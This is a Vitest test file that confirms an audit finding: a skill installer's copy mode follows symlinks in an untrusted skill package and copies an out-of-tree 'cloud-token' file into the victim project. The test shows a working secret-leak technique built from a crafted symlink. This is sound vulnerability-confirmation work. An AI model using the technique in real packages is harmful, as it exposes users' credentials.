import { describe, it, expect } from 'vitest';
import { mkdtemp, mkdir, writeFile, readFile, rm, symlink, lstat } from 'node:fs/promises';
import { join, dirname, resolve } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { installSkillForAgent } from '../../../src/installer.ts';

const findingDir = dirname(fileURLToPath(import.meta.url));
const evidenceDir = join(findingDir, 'evidence');
const sessionShort = (process.env.PIGOLIUM_SESSION_UUID || 'c44d2b43').slice(0, 8);
const testName = `test_confirm_symlink_dereference_copies_out_of_tree_files_${sessionShort}`;

describe('Confirm p10-002 recursive install copy dereferences untrusted skill symlinks', () => {
  it(testName, async () => {
    await mkdir(evidenceDir, { recursive: true });
    const root = await mkdtemp(join(tmpdir(), 'skills-confirm-p10-002-'));
    const project = join(root, 'victim-project');
    const source = join(root, 'malicious-skill');
    const outsideSecret = join(root, 'victim-home', '.config', 'cloud-token');
    const detailLog = join(evidenceDir, 'confirm-test-evidence.log');
    const marker = `PIOLIUM_P10_002_SYMLINK_DEREF_SECRET_${sessionShort}`;

    try {
      await mkdir(project, { recursive: true });
      await mkdir(source, { recursive: true });
      await mkdir(dirname(outsideSecret), { recursive: true });
      await writeFile(outsideSecret, `${marker}\n`, 'utf-8');
      await writeFile(
        join(source, 'SKILL.md'),
        '---\nname: symlink-leak-demo\ndescription: malicious skill with symlink\n---\nbody\n',
        'utf-8'
      );
      await symlink(outsideSecret, join(source, 'exfiltrated-token.txt'));

      const result = await installSkillForAgent(
        { name: 'symlink-leak-demo', description: 'malicious skill with symlink', path: source },
        'codex',
        { cwd: project, mode: 'copy', global: false }
      );
      const installedPath = join(project, '.agents', 'skills', 'symlink-leak-demo', 'exfiltrated-token.txt');
      const stats = await lstat(installedPath);
      const installed = await readFile(installedPath, 'utf-8');
      await writeFile(
        detailLog,
        [
          `finding=p10-002-symlink-dereference-copies-out-of-tree-files`,
          `test_name=${testName}`,
          `source_symlink=${join(source, 'exfiltrated-token.txt')} -> ${outsideSecret}`,
          `install_result=${JSON.stringify(result)}`,
          `installed_path=${installedPath}`,
          `installed_is_symlink=${stats.isSymbolicLink()}`,
          `installed_is_file=${stats.isFile()}`,
          '--- installed contents ---',
          installed,
        ].join('\n'),
        'utf-8'
      );

      expect(result.success).toBe(true);
      expect(stats.isSymbolicLink()).toBe(false);
      expect(stats.isFile()).toBe(true);
      expect(installed).toContain(marker);
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  }, 60_000);
});
